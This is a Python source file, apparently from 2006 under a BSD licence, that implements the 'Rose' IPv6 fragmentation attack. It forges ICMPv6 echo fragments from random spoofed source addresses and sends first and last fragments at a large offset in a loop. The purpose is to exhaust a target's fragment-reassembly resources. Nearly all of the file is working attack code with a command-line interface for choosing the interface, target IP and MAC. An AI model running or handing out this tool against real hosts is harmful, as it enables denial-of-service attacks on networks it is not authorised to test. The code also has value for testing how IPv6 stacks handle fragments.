#
# rose.py - implemantation of the rose fragmentation attack
#            for ipv6.
#
#  Copyright (c) 2006 Clement Lecigne <clem1@FreeBSD.org>
#  All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 1. Redistributions of source code must retain the above copyright
#    notice, this list of conditions and the following disclaimer.
# 2. Redistributions in binary form must reproduce the above copyright
#    notice, this list of conditions and the following disclaimer in the
#    documentation and/or other materials provided with the distribution.
#
# THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
# OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
# HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
# OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
# SUCH DAMAGE.
#

#!/usr/bin/env python

import sys, pcs, getopt, time, random
from pcs.packets.icmpv6 import *
from pcs.packets.ipv6 import *
from pcs.packets.ethernet import *
from socket import *

def randipv6():
    """return random ipv6 address"""
    ipv6 = ""
        
    for i in range(0, 8):
        for p in range(0, 4):
            if random.randint(0, 1) % 2:
                ipv6 += chr(random.randint(0x30, 0x39))
            else:
                ipv6 += chr(random.randint(0x41, 0x46))
        if i != 7:
            ipv6 += ':'
    return inet_pton(AF_INET6, ipv6)


def rose(device, smac, dmac, dip6, occ):
    """loop by sending out two rose fragments"""
    c = pcs.PcapConnector(device)
    
    # ethernet header
    eth = ethernet()
    eth.dst = ether_atob(dmac)
    if smac != "":
        eth.src = ether_atob(smac)
    else:
        eth.src = "\x00\x08\xa1\x9f\x80"
    eth.type = ETHERTYPE_IPV6
    
    # ipv6 header
    ip = ipv6()
    ip.traffic_class = 0
    ip.flow = 0
    ip.next_header = IPV6_FRAG
    ip.hop = 255
    ip.dst = inet_pton(AF_INET6, dip6)
    ip.length = 16

    # fragments header
    fragh = frag()
    fragh.next_header = IPPROTO_ICMPV6
    fragh.reserved = 0
    fragh.res = 0

    # icmp header
    icmp6 = icmpv6(ICMP6_ECHO_REQUEST)
    icmp6.type = 128
    icmp6.code = 0
    icmp6.id = random.randint(0, 2**16-1)
    icmp6.sequence = 0
    icmp6.checksum = icmp6.cksum(ip, "", IPPROTO_ICMPV6)

    for i in range(occ):
        # change ip src.
        ip.src = randipv6()
        # first rose fragment.
        fragh.m = 1
        fragh.offset = 0
        fragh.identification = random.randint(0, 2**32-1)
        # sends out
        chain = pcs.Chain([eth, ip, fragh, icmp6])
        c.write(chain.bytes, len(chain.bytes))
        
        # second rose fragment.
        fragh.m = 0
        fragh.offset = 16330
        chain = pcs.Chain([eth, ip, fragh, icmp6])
        c.write(chain.bytes, len(chain.bytes))
        time.sleep(0.1)

def usage(prog):
    print "usage: python %s -i iface -d destination-ip -D destination-mac" % prog,
    print "[-S source-mac] [-n occ]"
    sys.exit(1)

def main():
    # default value
    occ = 100
    
    iface = smac = dmac = dip = ""

    try:
        opts, args = getopt.getopt(sys.argv[1:], "i:S:d:D:n:")
    except getopt.GetoptError:
        usage(sys.argv[0])
    for opt, arg in opts:
        if opt == "-i":
            iface = arg
        elif opt == "-S":
            smac = arg
        elif opt == "-d":
            dip = arg
        elif opt == "-D":
            dmac = arg
        elif opt == "-n":
            occ = int(arg)
        else:
            usage(sys.argv[0])

    if dmac == "" or dip == "" or iface == "":
        usage(sys.argv[0])

    rose(iface, smac, dmac, dip, occ)

    print "rose attack fragments sent..."

if __name__ == '__main__':
    main()

